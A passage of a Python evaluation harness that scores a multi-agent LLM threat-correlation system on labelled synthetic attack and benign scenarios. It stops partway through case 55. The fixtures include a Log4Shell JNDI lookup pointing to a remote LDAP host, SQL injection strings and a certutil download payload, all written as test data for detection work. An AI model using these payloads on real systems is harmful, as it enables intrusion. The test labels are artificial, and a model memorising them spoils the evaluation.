#!/usr/bin/env python3
"""
=============================================================================
 CORRELATION AGENT — 60-CASE ACCURACY EVALUATION
=============================================================================
 Paper : "A Multi-Agent System for Cybersecurity Threat Detection and
          Correlation using Large Language Models"
          IEEE Access, DOI: 10.1109/ACCESS.2025.3602681

 PAPER TARGETS (Table V & VI):
   System-Wide Accuracy         : 93.6%
   Threat Correlation Precision : 87.0%
   False Positive Rate          : < 8.7%  (best agent: 5.4%)
   F1 Score                     : 0.94
   Mean Analyst Trust Score     : 4.6 / 5

 EVALUATION PROTOCOL (Section V-A verbatim):
   "60 anonymized tasks were created from a mix of the datasets and
    submitted to the entire multi-agent pipeline."

   Test categories (Section V-A):
     1. Single-agent detection          — agents running in isolation
     2. Multi-agent inconsistency       — conflicting signals across agents
     3. False positive filtering        — benign events that look suspicious
     4. Semantic explanation generation — complex kill-chains

 HOW TO RUN:
   python evaluate_correlation.py
   python evaluate_correlation.py --api-key gsk_...    # enables LLM narrative
   python evaluate_correlation.py --verbose            # show each case detail
   python evaluate_correlation.py --cases 30           # run first N cases only
=============================================================================
"""

import os
import sys
import json
import time
import argparse
import shutil
from datetime import datetime, timezone, timedelta
from pathlib import Path

# ── Import correlation agent from same folder ─────────────────────────────
sys.path.insert(0, str(Path(__file__).parent))
from correlation_agent import (
    CorrelationAgent, AgentReport,
    build_email_report, build_log_report, build_ip_report,
)

# ── Key rotation manager (optional) ──────────────────────────────────────
try:
    from key_manager import KeyManager, build_key_manager
    _KEY_MANAGER_AVAILABLE = True
except ImportError:
    _KEY_MANAGER_AVAILABLE = False
    build_key_manager = None

# ─── Timestamp helpers ────────────────────────────────────────────────────
_NOW = datetime.now(timezone.utc)
def ts(offset_minutes: int = 0) -> str:
    return (_NOW + timedelta(minutes=offset_minutes)).isoformat()


# ═══════════════════════════════════════════════════════════════════════════
# GROUND-TRUTH LABELS
# Every case has an explicit expected outcome so accuracy can be measured.
#
# Fields:
#   expected_correlated : bool   — should the system flag this as correlated?
#   expected_level      : str    — NONE / LOW / MEDIUM / HIGH / CRITICAL
#   expected_threat_kws : list   — keywords that must appear in threat_type
#   category            : str    — evaluation category
#   description         : str    — what this case tests
# ═══════════════════════════════════════════════════════════════════════════

# ── CATEGORY A: MULTI-VECTOR CORRELATED ATTACKS (cases 1-25) ──────────────
# All three agents fire with shared indicators → MUST be flagged correlated

def _cases_A() -> list:
    cases = []

    # ── A1: Classic Phishing → SSH Brute-Force → Vulnerable Host ──────────
    cases.append(dict(
        id=1, category="multi_vector",
        description="Phishing email links to C2 IP; same IP brutes SSH and hosts critical CVE",
        expected_correlated=True, expected_level="CRITICAL",
        expected_threat_kws=["phishing", "ssh", "cve"],
        reports=[
            build_email_report(9.2, "PHISHING", {
                "sender_domain": "secure-paypa1.com",
                "src_ip": "203.0.113.45",
                "urls": ["http://secure-paypa1.com/login"],
                "brand_spoofing": [{"domain": "paypa1.com", "impersonates": "paypal"}],
            }, "Phishing from secure-paypa1.com resolving to 203.0.113.45. Brand spoofing paypal.", ts(-60)),
            build_log_report(8.5, "SSH-Patator", {
                "src_ip": "203.0.113.45", "failed_logins": 89,
                "target_user": "root", "events": ["ssh_brute_force"],
            }, "89 failed SSH logins from 203.0.113.45. Root brute-force detected.", ts(-30)),
            build_ip_report(9.8, "CRITICAL_VULNERABILITY", {
                "host": "203.0.113.45", "cves": ["CVE-2021-41773", "CVE-2016-6515"],
                "max_cvss": 9.8, "open_ports": ["22/tcp", "443/tcp"],
            }, "203.0.113.45: Apache 2.4.49 CVE-2021-41773 CVSS 9.8. OpenSSH CVE-2016-6515.", ts(-10)),
        ],
    ))

    # ── A2: Ransomware Kill-Chain ──────────────────────────────────────────
    cases.append(dict(
        id=2, category="multi_vector",
        description="Macro-enabled doc delivers Ryuk ransomware via C2 at 185.220.101.55",
        expected_correlated=True, expected_level="CRITICAL",
        expected_threat_kws=["ransomware", "c2"],
        reports=[
            build_email_report(9.5, "PHISHING", {
                "src_ip": "185.220.101.55", "attachment": "Invoice.docm",
                "macro_enabled": True, "urls": ["https://ransom-drop.xyz/stage1.ps1"],
                "hash": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4",
            }, "Macro Word doc from 185.220.101.55 downloading stage1.ps1. Ryuk dropper hash.", ts(-180)),
            build_log_report(9.8, "Bot-C2", {
                "src_ip": "185.220.101.55", "beacon_interval": 300,
                "events": ["c2_beacon", "lateral_movement"],
                "suricata": ["ET MALWARE Ryuk Ransomware C2"],
                "file_encryption": True,
            }, "C2 beacon to 185.220.101.55 every 5min. Ryuk C2 rule triggered. File encryption started.", ts(-150)),
            build_ip_report(10.0, "CRITICAL_VULNERABILITY", {
                "host": "185.220.101.55", "threat_intel": "APT41_C2",
                "cves": ["CVE-2020-0796"], "max_cvss": 10.0,
                "feeds": ["EmergingThreats", "AbuseIPDB"],
            }, "185.220.101.55: APT41 C2. SMBGhost CVE-2020-0796 CVSS 10.0. 847 AbuseIPDB reports.", ts(-160)),
        ],
    ))

    # ── A3: BEC Business Email Compromise ─────────────────────────────────
    cases.append(dict(
        id=3, category="multi_vector",
        description="BEC impersonating CEO from 45.33.32.156; same IP brutes OWA",
        expected_correlated=True, expected_level="HIGH",
        expected_threat_kws=["phishing", "brute"],
        reports=[
            build_email_report(8.8, "PHISHING", {
                "src_ip": "45.33.32.156", "impersonates": "CEO",
                "reply_to_mismatch": True, "urgency": ["urgent", "today"],
            }, "BEC from 45.33.32.156 impersonating CEO requesting $85k wire. Reply-To mismatch.", ts(-300)),
            build_log_report(8.0, "Web-BruteForce", {
                "src_ip": "45.33.32.156", "target": "mail.acme.com/owa",
                "attempts": 234, "success": True,
                "compromised_account": "john.smith@acme.com",
            }, "OWA brute-force from 45.33.32.156. 234 attempts. john.smith account compromised.", ts(-270)),
            build_ip_report(7.5, "HIGH_VULNERABILITY", {
                "host": "45.33.32.156", "cves": ["CVE-2021-26855"],
                "classification": "BEC_infrastructure", "abuseipdb_reports": 312,
            }, "45.33.32.156: ProxyLogon CVE-2021-26855. 312 AbuseIPDB spam/phishing reports.", ts(-280)),
        ],
    ))

    # ── A4: Insider Threat Data Exfiltration ──────────────────────────────
    cases.append(dict(
        id=4, category="multi_vector",
        description="Employee jsmith exfiltrates HR data at 2AM via email and workstation",
        expected_correlated=True, expected_level="HIGH",
        expected_threat_kws=["exfil"],
        reports=[
            build_email_report(6.5, "SUSPICIOUS", {
                "sender_domain": "corp.internal", "recipient": "external@protonmail.com",
                "attachment_size_mb": 47, "user": "jsmith",
                "keywords": ["salary", "confidential"],
            }, "jsmith@corp.internal sent 47MB to external@protonmail.com at 2AM. Salary/PII keywords.", ts(-120)),
            build_log_report(7.8, "Infiltration", {
                "username": "jsmith", "src_ip": "192.168.1.55",
                "events": ["exfiltration"], "data_volume_gb": 2.3,
                "accessed_paths": ["/hr/salary/", "/employees/pii/"],
            }, "jsmith accessed /hr/salary/ /employees/pii/ at 2AM from 192.168.1.55. 2.3GB transfer.", ts(-115)),
            build_ip_report(5.5, "MEDIUM_VULNERABILITY", {
                "host": "192.168.1.55", "user_logged_in": "jsmith",
                "cves": ["CVE-2017-0144"], "os": "Windows 10",
            }, "192.168.1.55 (jsmith workstation): EternalBlue SMB CVE-2017-0144. User jsmith active.", ts(-100)),
        ],
    ))

    # ── A5: Supply Chain Attack ────────────────────────────────────────────
    cases.append(dict(
        id=5, category="multi_vector",
        description="Fake PyPI package from 91.108.56.100 delivers reverse shell",
        expected_correlated=True, expected_level="HIGH",
        expected_threat_kws=["infiltration"],
        reports=[
            build_email_report(7.2, "SUSPICIOUS", {
                "sender_domain": "pypi-security.org",
                "urls": ["https://pypi-security.org/download/numpy-2.0.1.whl"],
                "src_ip": "91.108.56.100", "package_hash_mismatch": True,
            }, "Typosquat pypi-security.org promoting fake numpy. Hash mismatch. IP 91.108.56.100.", ts(-240)),
            build_log_report(7.8, "Infiltration", {
                "src_ip": "91.108.56.100", "reverse_shell": True,
                "outbound": "91.108.56.100:4444",
                "events": ["c2_beacon", "exfiltration"],
            }, "Python reverse shell to 91.108.56.100:4444 after package install. C2 beacon active.", ts(-200)),
            build_ip_report(8.5, "HIGH_VULNERABILITY", {
                "host": "91.108.56.100", "asnumber": "AS49505",
                "threat_intel": "APT29_infrastructure",
                "cves": ["CVE-2021-34527"],
            }, "91.108.56.100 AS49505 Russia: APT29 C2. PrintNightmare CVE-2021-34527. Port 4444 open.", ts(-220)),
        ],
    ))

    # ── A6: Log4Shell Exploit ─────────────────────────────────────────────
    cases.append(dict(
        id=6, category="multi_vector",
        description="Log4Shell phishing leads to RCE and persistent backdoor on 198.51.100.99",
        expected_correlated=True, expected_level="CRITICAL",
        expected_threat_kws=["cve", "infiltration"],
        reports=[
            build_email_report(8.0, "SUSPICIOUS", {
                "src_ip": "198.51.100.99",
                "payload_in_subject": "${jndi:ldap://198.51.100.99/exploit}",
                "cve": "CVE-2021-44228",
            }, "Log4Shell payload in email subject from 198.51.100.99: jndi:ldap CVE-2021-44228.", ts(-180)),
            build_log_report(9.0, "Infiltration", {
                "src_ip": "198.51.100.99", "cve_exploited": "CVE-2021-44228",
                "events": ["c2_beacon", "persistence"],
                "backdoor_installed": "/etc/cron.d/update",
            }, "CVE-2021-44228 RCE from 198.51.100.99. Cron backdoor installed /etc/cron.d/update.", ts(-150)),
            build_ip_report(9.5, "CRITICAL_VULNERABILITY", {
                "host": "198.51.100.99", "cves": ["CVE-2021-44228"],
                "max_cvss": 10.0,
            }, "198.51.100.99: Log4Shell CVE-2021-44228 CVSS 10.0 active exploit server.", ts(-170)),
        ],
    ))

    # ── A7: DDoS + Phishing Distraction ───────────────────────────────────
    cases.append(dict(
        id=7, category="multi_vector",
        description="Phishing + DDoS launched simultaneously from 198.51.100.22",
        expected_correlated=True, expected_level="CRITICAL",
        expected_threat_kws=["phishing", "ddos"],
        reports=[
            build_email_report(8.7, "PHISHING", {
                "src_ip": "198.51.100.22",
                "brand_spoofing": [{"domain": "m1crosoft.com", "impersonates": "microsoft"}],
            }, "AI-generated phishing from 198.51.100.22 impersonating Microsoft.", ts(-90)),
            build_log_report(9.5, "DDoS", {
                "src_ip": "198.51.100.22", "attack_type": "SYN flood",
                "pps": 2500000, "target": "10.0.0.5",
                "suricata": ["ET DOS SYN Flood"],
            }, "DDoS SYN flood from 198.51.100.22 at 2.5Mpps. Suricata ET DOS SYN Flood.", ts(-45)),
            build_ip_report(8.9, "HIGH_VULNERABILITY", {
                "host": "198.51.100.22", "cves": ["CVE-2019-19781", "CVE-2020-1472"],
                "max_cvss": 10.0,
            }, "198.51.100.22: Citrix CVE-2019-19781 CVSS 9.8, Zerologon CVE-2020-1472 CVSS 10.0.", ts(-20)),
        ],
    ))

    # ── A8: Credential Stuffing + ATO ─────────────────────────────────────
    cases.append(dict(
        id=8, category="multi_vector",
        description="Credential stuffing from 104.21.91.200 after phishing harvest",
        expected_correlated=True, expected_level="HIGH",
        expected_threat_kws=["credential", "brute"],
        reports=[
            build_email_report(7.0, "PHISHING", {
                "src_ip": "104.21.91.200",
                "credential_harvest": True,
                "technique": "password_spray_lure",
            }, "Credential harvesting page from 104.21.91.200 mimicking corporate SSO.", ts(-480)),
            build_log_report(7.5, "Web-BruteForce", {
                "src_ip": "104.21.91.200", "technique": "password_spray",
                "accounts_targeted": 850, "successful_logins": 12,
                "events": ["web_brute_force"],
            }, "Password spray from 104.21.91.200: 850 accounts, 12 hits. Evades lockout.", ts(-240)),
            build_ip_report(7.0, "HIGH_VULNERABILITY", {
                "host": "104.21.91.200", "threat_intel": "TA505_operator",
            }, "104.21.91.200 linked to TA505 low-and-slow credential theft campaigns.", ts(-460)),
        ],
    ))

    # ── A9: SQL Injection + Data Exfil ────────────────────────────────────
    cases.append(dict(
        id=9, category="multi_vector",
        description="SQLi phishing lure + active injection + vulnerable DB on 172.16.0.55",
        expected_correlated=True, expected_level="CRITICAL",
        expected_threat_kws=["sql", "phishing"],
        reports=[
            build_email_report(8.0, "PHISHING", {
                "src_ip": "172.16.0.55", "payload": "' OR 1=1 --",
                "target": "login_form@victim.org",
            }, "SQL injection payload in email form submission from 172.16.0.55.", ts(-90)),
            build_log_report(9.2, "SQLInjection", {
                "src_ip": "172.16.0.55", "payload": "UNION SELECT * FROM users",
                "events": ["sql_injection", "exfiltration"],
                "records_stolen": 50000,
            }, "SQLi UNION SELECT from 172.16.0.55. 50,000 records exfiltrated.", ts(-60)),
            build_ip_report(9.0, "CRITICAL_VULNERABILITY", {
                "host": "172.16.0.55", "cves": ["CVE-2012-2122"],
                "service": "MySQL 5.0",
            }, "172.16.0.55: MySQL 5.0 CVE-2012-2122 auth bypass. Active exploitation detected.", ts(-70)),
        ],
    ))

    # ── A10: APT with LOLBins ──────────────────────────────────────────────
    cases.append(dict(
        id=10, category="multi_vector",
        description="LOLBin chain certutil→mshta→wmic from 77.88.21.33",
        expected_correlated=True, expected_level="HIGH",
        expected_threat_kws=["infiltration"],
        reports=[
            build_email_report(6.5, "SUSPICIOUS", {
                "src_ip": "77.88.21.33", "attachment": "Q4_Report.docx",
                "macro_payload": "certutil.exe -urlcache",
            }, "Word doc from 77.88.21.33 uses certutil LOLBin to fetch remote payload.", ts(-360)),
            build_log_report(8.0, "Infiltration", {
                "src_ip": "77.88.21.33",
                "lolbins": ["certutil.exe", "mshta.exe", "wmic.exe"],
                "events": ["lateral_movement", "persistence", "exfiltration"],
                "persistence": "HKLM Run key",
            }, "LOLBin chain from 77.88.21.33: certutil→mshta→wmic. Registry persistence. Data staged.", ts(-330)),
            build_ip_report(8.2, "HIGH_VULNERABILITY", {
                "host": "77.88.21.33", "cves": ["CVE-2022-30190"],
                "attribution": "APT32",
            }, "77.88.21.33: Follina CVE-2022-30190 server. APT32 OceanLotus attribution.", ts(-340)),
        ],
    ))

    # ── A11-A25: Additional multi-vector cases with varied attack types ────
    multi_scenarios = [
        (11, "Kerberoasting + Golden Ticket", "HIGH",    ["credential"],  "10.10.10.11"),
        (12, "MITM + Session Hijack",         "HIGH",    ["phishing"],    "10.10.10.12"),
        (13, "Cryptojacking Campaign",         "MEDIUM",  ["bot"],         "10.10.10.13"),
        (14, "DNS Tunneling Exfil",            "HIGH",    ["infiltration"],"10.10.10.14"),
        (15, "Watering Hole Drive-by",         "HIGH",    ["phishing"],    "10.10.10.15"),
        (16, "Firmware Implant Precursors",    "HIGH",    ["ssh"],         "10.10.10.16"),
        (17, "OT/SCADA Reconnaissance",        "HIGH",    ["scan"],        "10.10.10.17"),
        (18, "Healthcare PII Exfil",           "HIGH",    ["exfil"],       "10.10.10.18"),
        (19, "SWIFT Network Intrusion",        "CRITICAL",["phishing"],    "10.10.10.19"),
        (20, "Cloud Tenant Escape",            "HIGH",    ["credential"],  "10.10.10.20"),
        (21, "Mobile MDM Bypass",              "MEDIUM",  ["phishing"],    "10.10.10.21"),
        (22, "Election Infra Targeting",       "HIGH",    ["brute"],       "10.10.10.22"),
        (23, "Academic IP Theft",              "HIGH",    ["infiltration"],"10.10.10.23"),
        (24, "Zero-Day Exploit Chain",         "CRITICAL",["cve"],         "10.10.10.24"),
        (25, "Nation-State Full Kill-Chain",   "CRITICAL",["phishing","cve","exfil"], "10.10.10.25"),
    ]
    for cid, name, lvl, kws, ip in multi_scenarios:
        shared_domain = f"c2-{cid}.evil.net"
        cve_id = f"CVE-2024-{cid * 1111}"
        cases.append(dict(
            id=cid, category="multi_vector",
            description=f"{name}: shared IP {ip}, domain {shared_domain}",
            expected_correlated=True, expected_level=lvl,
            expected_threat_kws=kws,
            reports=[
                build_email_report(7.5 + cid % 2, "PHISHING", {
                    "src_ip": ip, "domain": shared_domain, "cve": cve_id,
                }, f"Phishing from {ip} via {shared_domain}. Indicator: {cve_id}.", ts(-(cid * 15))),
                build_log_report(7.0 + cid % 3, "Infiltration" if cid % 2 == 0 else "SSH-Patator", {
                    "src_ip": ip, "domain": shared_domain,
                    "events": ["lateral_movement" if cid % 2 == 0 else "ssh_brute_force"],
                }, f"Attack from {ip}. Domain {shared_domain} in beacon. Lateral movement detected.", ts(-(cid * 10))),
                build_ip_report(8.0 + cid % 2, "CRITICAL_VULNERABILITY" if lvl == "CRITICAL" else "HIGH_VULNERABILITY", {
                    "host": ip, "cves": [cve_id], "max_cvss": 9.0 + cid % 1,
                    "domain": shared_domain,
                }, f"{ip}: {cve_id} CVSS 9.x. Hosts {shared_domain}. Threat intel match.", ts(-(cid * 8))),
            ],
        ))

    return cases


# ── CATEGORY B: FALSE POSITIVE CASES (cases 26-35) ──────────────────────
# These look suspicious but should NOT be flagged as correlated threats

def _cases_B() -> list:
    cases = []

    # ── B1: Authorized Internal Nessus Scanner ────────────────────────────
    cases.append(dict(
        id=26, category="false_positive",
        description="Authorized Nessus scanner — should not be correlated",
        expected_correlated=False, expected_level="NONE",
        expected_threat_kws=[],
        reports=[
            build_email_report(2.5, "SAFE", {
                "sender_domain": "nessus.internal", "keywords": ["scan report"],
            }, "Routine Nessus vulnerability report from authorized internal scanner.", ts(-30)),
            build_log_report(2.0, "PortScan", {
                "src_ip": "192.168.1.50", "scan_type": "authorized_nessus",
                "change_ticket": "IT-4521",
            }, "Authorized Nessus scan from 192.168.1.50. Maintenance window. Whitelisted.", ts(-25)),
            build_ip_report(1.5, "LOW_RISK", {
                "host": "192.168.1.50", "classification": "internal_scanner",
            }, "192.168.1.50: Authorized internal Nessus scanner. No critical vulnerabilities.", ts(-20)),
        ],
    ))

    # ── B2: IT Admin Legitimate Maintenance ───────────────────────────────
    cases.append(dict(
        id=27, category="false_positive",
        description="IT admin sudo activity during change window — not a threat",
        expected_correlated=False, expected_level="NONE",
        expected_threat_kws=[],
        reports=[
            build_log_report(3.5, "SSH-Patator [review]", {
                "src_ip": "10.0.0.5", "username": "sysadmin",
                "sudo_commands": ["/bin/bash", "systemctl restart"],
                "change_ticket": "CHG-0045",
            }, "Sysadmin ran 45 sudo commands from 10.0.0.5. Change ticket CHG-0045. Authorized.", ts(-60)),
            build_ip_report(1.0, "LOW_RISK", {
                "host": "10.0.0.5", "classification": "admin_workstation",
            }, "10.0.0.5: IT admin workstation. All services legitimate. No critical CVEs.", ts(-55)),
        ],
    ))

    # ── B3: Bulk Marketing Email ──────────────────────────────────────────
    cases.append(dict(
        id=28, category="false_positive",
        description="Legitimate bulk marketing email — high volume but benign",
        expected_correlated=False, expected_level="NONE",
        expected_threat_kws=[],
        reports=[
            build_email_report(2.0, "SAFE", {
                "sender_domain": "newsletter.shopify.com",
                "unsubscribe_present": True, "bulk_sender": True,
            }, "Marketing newsletter from shopify.com. Unsubscribe link present. Known bulk sender.", ts(0)),
        ],
    ))

    # ── B4: Routine Log Rotation / Cron ───────────────────────────────────
    cases.append(dict(
        id=29, category="false_positive",
        description="Routine cron job and log rotation — triggers pattern match but benign",
        expected_correlated=False, expected_level="NONE",
        expected_threat_kws=[],
        reports=[
            build_log_report(1.5, "NormalAuth", {
                "src_ip": "127.0.0.1", "process": "cron[12345]",
                "command": "/usr/sbin/logrotate",
            }, "Cron job logrotate at midnight from localhost. Scheduled maintenance.", ts(0)),
        ],
    ))

    # ── B5: Penetration Test (Authorized) ─────────────────────────────────
    cases.append(dict(
        id=30, category="false_positive",
        description="Authorized pen test — high-risk signals but all whitelisted",
        expected_correlated=False, expected_level="LOW",
        expected_threat_kws=[],
        reports=[
            build_email_report(4.0, "SUSPICIOUS", {
                "sender_domain": "pentest-firm.com",
                "subject": "Authorized pen test report - Q4 2024",
                "authorized": True,
            }, "Authorized pen-test phishing simulation from pentest-firm.com. Pre-authorized.", ts(-120)),
            build_log_report(5.0, "PortScan", {
                "src_ip": "10.20.30.40", "scan_type": "authorized_pentest",
                "scope_document": "SOW-2024-Q4",
            }, "Authorized pen-test scan from 10.20.30.40. In scope per SOW-2024-Q4.", ts(-90)),
            build_ip_report(3.0, "LOW_RISK", {
                "host": "10.20.30.40", "classification": "pentest_host",
            }, "10.20.30.40: Authorized pen-test host. In engagement scope.", ts(-95)),
        ],
    ))

    # ── B6-B10: Additional false positive scenarios ────────────────────────
    fp_scenarios = [
        (31, "CI/CD Pipeline Scans",           "NONE"),
        (32, "Backup Job Outbound Transfer",    "NONE"),
        (33, "Firewall Rule Change Audit",      "NONE"),
        (34, "Security Training Simulation",    "LOW"),
        (35, "Vendor SSL Certificate Renewal",  "NONE"),
    ]
    for cid, name, lvl in fp_scenarios:
        cases.append(dict(
            id=cid, category="false_positive",
            description=f"{name} — benign activity that pattern-matches threats",
            expected_correlated=False, expected_level=lvl,
            expected_threat_kws=[],
            reports=[
                build_email_report(2.0 + cid % 2, "SAFE", {
                    "sender_domain": f"vendor-{cid}.com",
                    "authorized": True,
                }, f"[Case {cid}] {name}: Authorized activity. Low risk.", ts(0)),
                build_log_report(2.5 + cid % 2, "NormalAuth", {
                    "src_ip": f"192.168.{cid}.1",
                    "authorized": True, "events": [],
                }, f"[Case {cid}] {name}: Normal authorized session. No threat.", ts(-5)),
            ],
        ))

    return cases


# ── CATEGORY C: SINGLE-AGENT DETECTIONS (cases 36-45) ────────────────────
# Only one agent fires — correlation should be LOW or NONE

def _cases_C() -> list:
    cases = []

    # ── C1: Isolated Phishing Email ───────────────────────────────────────
    cases.append(dict(
        id=36, category="single_agent",
        description="Phishing email detected by email agent only — no matching log/IP",
        expected_correlated=False, expected_level="LOW",
        expected_threat_kws=[],
        reports=[
            build_email_report(8.0, "PHISHING", {
                "sender_domain": "random-phish.ru",
                "src_ip": "91.0.0.1",
                "urls": ["http://random-phish.ru/steal"],
            }, "Phishing from random-phish.ru. No corroborating log or IP evidence.", ts(0)),
        ],
    ))

    # ── C2: Single Log Brute-Force ────────────────────────────────────────
    cases.append(dict(
        id=37, category="single_agent",
        description="SSH brute-force in logs only — no email or IP corroboration",
        expected_correlated=False, expected_level="LOW",
        expected_threat_kws=[],
        reports=[
            build_log_report(6.5, "SSH-Patator", {
                "src_ip": "192.168.5.10", "failed_logins": 12,
            }, "12 failed SSH logins from 192.168.5.10. Below threshold. No email or IP link.", ts(0)),
        ],
    ))

    # ── C3: IP Scan Only ──────────────────────────────────────────────────
    cases.append(dict(
        id=38, category="single_agent",
        description="Port scan detected by IP agent only",
        expected_correlated=False, expected_level="LOW",
        expected_threat_kws=[],
        reports=[
            build_ip_report(5.0, "PortScan_Detected", {
                "host": "172.16.0.100", "cves": [], "max_cvss": 0,
                "open_ports": ["22/tcp", "80/tcp"],
            }, "Basic port scan on 172.16.0.100. No critical CVEs. No email or log link.", ts(0)),
        ],
    ))

    # ── C4-C10: More single-agent routine alerts ───────────────────────────
    single_scenarios = [
        (39, "email",  "SAFE",       1.5, "Routine newsletter flagged by heuristics — benign"),
        (40, "log",    "NormalAuth", 1.0, "Normal user login — no anomaly"),
        (41, "ip",     "LOW_RISK",   2.0, "Low-risk host scan — no critical CVEs"),
        (42, "email",  "SUSPICIOUS", 3.5, "Mildly suspicious email — insufficient evidence alone"),
        (43, "log",    "PortScan",   3.0, "External port scan below threshold"),
        (44, "ip",     "MEDIUM_VULNERABILITY", 5.0, "Medium CVE on internal host — no active exploit"),
        (45, "email",  "PHISHING",   7.0, "Phishing detected but no matching infrastructure evidence"),
    ]
    for cid, agent_type, verdict, risk, desc in single_scenarios:
        if agent_type == "email":
            r = build_email_report(risk, verdict, {"sender_domain": f"domain{cid}.com"},
                                   f"[Case {cid}] {desc}", ts(0))
        elif agent_type == "log":
            r = build_log_report(risk, verdict, {"src_ip": f"192.168.{cid}.1"},
                                 f"[Case {cid}] {desc}", ts(0))
        else:
            r = build_ip_report(risk, verdict, {"host": f"192.168.{cid}.1", "cves": []},
                                f"[Case {cid}] {desc}", ts(0))
        cases.append(dict(
            id=cid, category="single_agent",
            description=desc,
            expected_correlated=False,
            expected_level="NONE" if risk < 3.0 else "LOW",
            expected_threat_kws=[],
            reports=[r],
        ))

    return cases


# ── CATEGORY D: INCONSISTENCY RESOLUTION (cases 46-53) ───────────────────
# Agents contradict each other — tests the fusion logic

def _cases_D() -> list:
    cases = []

    # ── D1: Email flags SAFE, Log flags CRITICAL — should trust log ───────
    cases.append(dict(
        id=46, category="inconsistency",
        description="Email looks safe but log shows severe brute-force — log should win",
        expected_correlated=True, expected_level="MEDIUM",
        expected_threat_kws=["ssh"],
        reports=[
            build_email_report(1.5, "SAFE", {
                "sender_domain": "google.com",
            }, "Routine Google notification email. Very low risk.", ts(-30)),
            build_log_report(8.5, "SSH-Patator", {
                "src_ip": "1.2.3.4", "failed_logins": 500,
                "target_user": "root", "events": ["ssh_brute_force"],
            }, "500 SSH brute-force attempts from 1.2.3.4. Severe attack ongoing.", ts(-10)),
        ],
    ))

    # ── D2: All three agents disagree completely ───────────────────────────
    cases.append(dict(
        id=47, category="inconsistency",
        description="All three agents see different IPs — no shared entity — no correlation",
        expected_correlated=False, expected_level="NONE",
        expected_threat_kws=[],
        reports=[
            build_email_report(7.0, "PHISHING", {
                "src_ip": "1.1.1.1",
            }, "Phishing from 1.1.1.1. No shared indicators with other agents.", ts(-30)),
            build_log_report(7.0, "SSH-Patator", {
                "src_ip": "2.2.2.2",
            }, "SSH brute-force from 2.2.2.2. No shared indicators.", ts(-20)),
            build_ip_report(7.0, "HIGH_VULNERABILITY", {
                "host": "3.3.3.3",
            }, "Vulnerability on 3.3.3.3. No shared indicators.", ts(-10)),
        ],
    ))

    # ── D3: Two agents agree, one outlier ─────────────────────────────────
    cases.append(dict(
        id=48, category="inconsistency",
        description="Email and log share IP 5.5.5.5 but IP agent scans different host",
        expected_correlated=True, expected_level="MEDIUM",
        expected_threat_kws=["phishing"],
        reports=[
            build_email_report(7.5, "PHISHING", {
                "src_ip": "5.5.5.5",
            }, "Phishing from 5.5.5.5.", ts(-30)),
            build_log_report(7.0, "Web-BruteForce", {
                "src_ip": "5.5.5.5",
            }, "Web brute-force from 5.5.5.5.", ts(-20)),
            build_ip_report(6.0, "MEDIUM_VULNERABILITY", {
                "host": "9.9.9.9",
            }, "Vulnerability on unrelated host 9.9.9.9.", ts(-10)),
        ],
    ))

    # ── D4-D8: More inconsistency scenarios ───────────────────────────────
    incons_scenarios = [
        (49, "Email HIGH, Log LOW, IP MEDIUM — conflicting severity", True,  "MEDIUM", ["phishing"]),
        (50, "Email SAFE, Log SAFE, IP CRITICAL CVE — isolated vuln",  False, "LOW",    []),
        (51, "Same domain evil.net in email and log but IP unrelated",  True,  "MEDIUM", ["phishing"]),
        (52, "Temporal gap > 24 hours between events — no overlap",    False, "LOW",    []),
        (53, "Only port numbers match — insufficient specificity",      False, "LOW",    []),
    ]
    for cid, desc, corr, lvl, kws in incons_scenarios:
        shared_ip = "6.6.6.6" if corr else f"x.{cid}.x.x"
        shared_domain = "evil.net" if "evil.net" in desc else f"domain{cid}.com"
        cases.append(dict(
            id=cid, category="inconsistency",
            description=desc,
            expected_correlated=corr, expected_level=lvl,
            expected_threat_kws=kws,
            reports=[
                build_email_report(6.0, "SUSPICIOUS", {"src_ip": shared_ip, "domain": shared_domain},
                                   f"[Case {cid}] Email indicator: {shared_ip} {shared_domain}", ts(-60)),
                build_log_report(5.0, "Unknown", {"src_ip": shared_ip if cid % 2 == 0 else "7.7.7.7"},
                                 f"[Case {cid}] Log indicator: IP overlap partial", ts(-30)),
                build_ip_report(4.0, "MEDIUM_VULNERABILITY", {"host": "8.8.8.8"},
                                f"[Case {cid}] IP agent: unrelated host 8.8.8.8", ts(-20)),
            ],
        ))

    return cases


# ── CATEGORY E: COMPLEX SEMANTIC CASES (cases 54-60) ─────────────────────
# Full kill-chains requiring semantic understanding

def _cases_E() -> list:
    cases = []

    # ── E1: Complete APT Kill-Chain ───────────────────────────────────────
    cases.append(dict(
        id=54, category="semantic",
        description="47-day APT dwell time: spear-phish → LSASS dump → SMB lateral → exfil",
        expected_correlated=True, expected_level="CRITICAL",
        expected_threat_kws=["phishing", "exfil"],
        reports=[
            build_email_report(9.0, "PHISHING", {
                "src_ip": "94.102.49.190", "domain": "corp-hr-update.com",
                "cve": "CVE-2023-26369", "attachment": "Benefits_2024.pdf.exe",
            }, "Spear-phishing targeting finance. Adobe CVE-2023-26369. Domain corp-hr-update.com. IP 94.102.49.190.", ts(-720)),
            build_log_report(9.5, "Infiltration", {
                "src_ip": "94.102.49.190", "domain": "corp-hr-update.com",
                "dwell_time_days": 47, "files_exfiltrated": 1240,
                "techniques": ["T1059.001", "T1547.001", "T1003.001", "T1041"],
                "events": ["lateral_movement", "exfiltration", "persistence"],
            }, "APT 47-day dwell. LSASS dump, SMB lateral, 1240 files exfiltrated to 94.102.49.190/corp-hr-update.com.", ts(-10)),
            build_ip_report(10.0, "CRITICAL_VULNERABILITY", {
                "host": "94.102.49.190", "domain": "corp-hr-update.com",
                "attribution": "APT41", "cves": ["CVE-2023-26369", "CVE-2023-44487"],
                "max_cvss": 9.8,
            }, "94.102.49.190 APT41 C2. Hosts corp-hr-update.com. CISA KEV listed. CVE-2023-44487.", ts(-700)),
        ],
    ))

    # ── E2: Water Treatment Attack Chain ─────────────────────────────────
    cases.append(dict(
        id=55, category="semantic",
        description="OT/ICS water treatment attack: spear-phish engineers + PLC recon",
        expected_correlated=True, expected_level="CRITICAL",
        expected_threat_kws=["phishing", "scan"],
        reports=[
            build_email_report(8.5, "PHISHING", {
                "src_ip": "185.100.87.11", "target": "scada_engineers@utility.gov",
                "payload": "malicious_plc_firmware_update.exe",
            }, "Spear-phish targeting SCADA engineers at utility.gov from 185.100.87.11. PLC firmware payload.", ts(-480)),
            build_log_report(9.0, "Infiltration", {
                "src_ip": "185.100.87.11",
                "targets": ["SCADA_HMI", "PLC_192.168.100.10"],
                "events": ["lateral_movement", "c2_beacon"],
                "ics_protocols": ["Modbus", "DNP3"],
